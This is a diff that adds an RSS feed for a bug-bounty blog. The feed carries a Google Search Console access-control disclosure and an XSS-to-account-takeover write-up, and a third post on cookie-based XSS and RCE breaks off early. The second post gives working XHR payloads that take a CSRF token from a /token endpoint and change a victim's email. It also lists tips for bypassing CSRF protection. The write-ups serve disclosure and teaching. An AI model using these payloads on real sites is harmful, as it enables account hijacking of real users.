@@ -1,0 +1,720 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Noobe.io</title>
+    <description>Just another noob post.</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>2020-01-18</pubDate>
+    <lastBuildDate>Sat, 18 Jan 2020 17:25:10 +0700</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>How I accidentally found Bug in Google Search Console</title>
+        <description>&lt;p&gt;بسم الله الرحمن الرحيم&lt;/p&gt;
+
+&lt;p&gt;In this simple writeup, I would like to tell how I found an Access Control bug in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Google Search Console&lt;/code&gt; application, where I can get information related to the domain that I added to the application even though the domain was not successfully verified by me.&lt;/p&gt;
+
+&lt;p&gt;It started when I wanted to add my website to Google Search Console. I found a form to enter a domain name to add to the application. So I try to add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google.com&lt;/code&gt; as my domain.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40b89ba586da5e300fe220d4af958c52-1.png&quot; alt=&quot;Add Domain&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After submiting the domain name, then a popup box appears to continue the domain verification process. There are several ways to verify the domain, such uploading an HTML file, and adding a meta tag to the website header.&lt;/p&gt;
+
+&lt;p&gt;In this process, I tried a several techniques to bypass the process, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Tampering the Request&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Polluting the Parameter&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Manipulate Responses&lt;/code&gt;, but everything is fail.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40b89ba586da5e300fe220d4af958c52-2.png&quot; alt=&quot;Domain Verification&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I didn’t try more things for this, because at first I just wanted to add my website to Google Search Console, not to find bugs.&lt;/p&gt;
+
+&lt;p&gt;A few days later, I got an unusual email in my inbox. The email informs me about an update to the domain that registered in my Google Search Console. But the information sent is an update from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google.com&lt;/code&gt;!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40b89ba586da5e300fe220d4af958c52-3.png&quot; alt=&quot;Domain Update Notification&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Of course this is a bug, because at first I was unable to verify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;google.com&lt;/code&gt; domain. It seems that the system cannot validate whether my account has successfully verified the domain or not, so when there is an update on that domain, the information will be sent to my email.&lt;/p&gt;
+
+&lt;p&gt;So I reported the bug through Google VRP, and a few days later I got &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nice Catch!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40b89ba586da5e300fe220d4af958c52-4.png&quot; alt=&quot;Nice Catch!&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Through this bug, someone can get information related to a domain registered in Google Search Console. Only by adding the domain in his account, so every time there is an update, he will get that information. For this bug, Google awarded me a reward of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1337&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/40b89ba586da5e300fe220d4af958c52-5.png&quot; alt=&quot;Reward&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2020-01/how-i-found-bug-google-search-console</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2020-01/how-i-found-bug-google-search-console</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>google</category>
+        
+        <category>broken access control</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+      <item>
+        <title>XSS to Account Takeover - Bypassing CSRF Header Protection and HTTPOnly Cookie</title>
+        <description>&lt;p&gt;بسم الله الرحمن الرحيم&lt;/p&gt;
+
+&lt;p&gt;When doing a Bug Hunting and finding a Stored XSS bug, usually the imagination will get a big enough bounty has been spinning around on the head. But sometimes the imagination fades when we try to insert document.cookie into the XSS payload and what appears is:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/5d02f144bca472117661e342a29bf504-1.png&quot; alt=&quot;Blank Cookie&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Popup alerts are expected to display cookies from the target website but instead display nothing because &lt;em&gt;the cookies on the website are set HTTPOnly so that they cannot be accessed by javascript&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;When you find something like this, usually the next option is to make a request using &lt;strong&gt;XHR&lt;/strong&gt; to ‘force’ users to take sensitive actions without their knowledge. For example, changing passwords or changing email addresses.&lt;/p&gt;
+
+&lt;p&gt;And when will do that, requests are sent as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 3005c34f-4cea-4470-afe8-045f1c14a2af
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=3005c34f-4cea-4470-afe8-045f1c14a2af;
+
+{&quot;email&quot;:&quot;pwn@1337.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Seen in the request header there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf&lt;/code&gt; token that aims to prevent &lt;strong&gt;CSRF&lt;/strong&gt; attacks. So the exploitation process becomes more difficult because there is a &lt;strong&gt;CSRF&lt;/strong&gt; header that changes every time a request is made.&lt;/p&gt;
+
+&lt;p&gt;When viewed closely, the request header and cookie have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-tokens&lt;/code&gt; with the same value. So I tried to change the two values into another value, but still the same.&lt;/p&gt;
+
+&lt;p&gt;Request:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=asu;
+
+{&quot;email&quot;:&quot;pwn@1337.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Response:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{&quot;changingEmailCompleted&quot;:true}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Boom! It turned out that the email was successfully changed using this method. This means we can manipulate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; in the header to anything as long as the value is the same as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; in the cookie.&lt;/p&gt;
+
+&lt;p&gt;Since we cannot access cookies, I have tried adding new cookies using the following script:&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;csrf-token=asu&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When trying to make a request, the response is as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/5d02f144bca472117661e342a29bf504-2.png&quot; alt=&quot;CSRF Detected&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Why does the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Possible CSRF attack detected&lt;/code&gt; message appear ?&lt;/p&gt;
+
+&lt;p&gt;When rechecking is done, the request turns out to be like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /user/changeEmail HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: asu
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: csrf-token=asu; JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+
+{&quot;email&quot;:&quot;pwn@1337.com&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There appear 2 cookies named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt;, this seems to be the cause of the error earlier.&lt;/p&gt;
+
+&lt;p&gt;Since we don’t do anything to the cookies, all we can use here is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; in the request header. But of course we must get a valid value.&lt;/p&gt;
+
+&lt;p&gt;This website is built using AngularJS, there is no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; value stored in the HTML code, and the value of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cookie&lt;/code&gt; changes with every request.&lt;/p&gt;
+
+&lt;p&gt;Wait, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;always changing every request?&lt;/code&gt; This means that there are times when the server sends a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cookie&lt;/code&gt; to the browser. So I tried to find out when that moment happened.&lt;/p&gt;
+
+&lt;p&gt;Then a background request is found to the endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/token&lt;/code&gt; as follows:&lt;/p&gt;
+
+&lt;p&gt;Request:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /token HTTP/1.1
+Host: redacted.com
+Connection: close
+Content-Length: 84
+Sec-Fetch-Mode: cors
+csrf-token: 0b84028f-35de-4bd6-bf72-a0a776a7b3f2
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Type: application/json; charset=UTF-8
+Accept: */*
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,eu;q=0.6
+Cookie: JSESSIONID=_zo6sV5qYkxhYwSCULJ4KRzOqP3G_-xVma2rKVPo; csrf-token=0b84028f-35de-4bd6-bf72-a0a776a7b3f2;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Response:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+Connection: close
+Date: Fri, 04 Oct 2019 15:08:38 GMT
+Server: nginx
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+Cache-Control: no-cache, no-store, must-revalidate
+Set-Cookie: csrf-token=725d97de-550d-4644-9579-d4b3e1209ded; path=/; secure; HttpOnly
+X-XSS-Protection: 1; mode=block
+Pragma: no-cache
+csrf-token: 725d97de-550d-4644-9579-d4b3e1209ded
+Content-Security-Policy: frame-ancestors 'self'
+X-Content-Type-Options: nosniff
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It can be seen that when making a request to endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/token&lt;/code&gt;, the server responds by giving a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt; cookie. Then we can use this request to retrieve the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;csrf-token&lt;/code&gt;, using a script like the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://redacted.com/token&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getResponseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;csrf-token&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the &lt;strong&gt;CSRF Token&lt;/strong&gt; was successfully obtained!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/5d02f144bca472117661e342a29bf504-3.png&quot; alt=&quot;CSRF Token&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, just combine it with the request to change the email earlier.&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://redacted.com/token&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onreadystatechange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getResponseHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;csrf-token&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ngambil token dari response header&lt;/span&gt;
+
+ &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://redacted.com/user/changeEmail&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;withCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;csrf-token&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setRequestHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Content-type&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;application/json; charset=UTF-8&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+ &lt;span class=&quot;nx&quot;&gt;xhr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;{&quot;email&quot;:&quot;pwn@1337.com&quot;}&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;Ups, You&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;re pwned!&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And the email address was successfully changed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/5d02f144bca472117661e342a29bf504-4.png&quot; alt=&quot;Pwn&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;When finding a Stored XSS but cannot get a cookie, don’t report it immediately because it is likely that the severity will decrease.&lt;/li&gt;
+  &lt;li&gt;Try to do chaining with other bugs, CSRF for example to perform sensitive actions&lt;/li&gt;
+  &lt;li&gt;When finding CSRF Protection, try to delete it or change its value to null, sometimes something magical can work.&lt;/li&gt;
+  &lt;li&gt;Look for other endpoints that can be used to obtain a valid CSRF Token.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>2020-01-18</pubDate>
+        <link>http://localhost:4000/articles/2019-10/xss-to-account-takeover</link>
+        <guid isPermaLink="true">http://localhost:4000/articles/2019-10/xss-to-account-takeover</guid>
+        
+        <category>bug hunting</category>
+        
+        <category>hacking</category>
+        
+        <category>csrf</category>
+        
+        <category>xss</category>
+        
+        <category>account takeover</category>
+        
+        
+        <category>bug hunting</category>
+        
+      </item>
+    
+      <item>
+        <title>Exploiting Cookie Based XSS by Finding RCE</title>
+        <description>&lt;p&gt;بسم الله الرحمن الرحيم&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;When doing penetrating on this target, I collaborated with &lt;a href=&quot;https://medium.com/@YoKoKho?source=post_page-----9a4065368ba3----------------------&quot;&gt;YoKo Kho&lt;/a&gt; to get the highest privileges. In this paper you may find a little similarity with &lt;a href=&quot;https://medium.com/bugbountywriteup/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3&quot;&gt;his trick&lt;/a&gt;. But in the real case, what we write is a different feature. If you have read his writing, this story is the prequel of it.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;While doing Bug Bounty Hunting , I found a &lt;strong&gt;Cookie Based XSS Vulnerability&lt;/strong&gt; on a website. Cookie Based XSS basically is a Self XSS. It will be very unfortunate if the findings were reported and only got Very Low Severity which for the severity there was no Bounty or Points given.&lt;/p&gt;
+
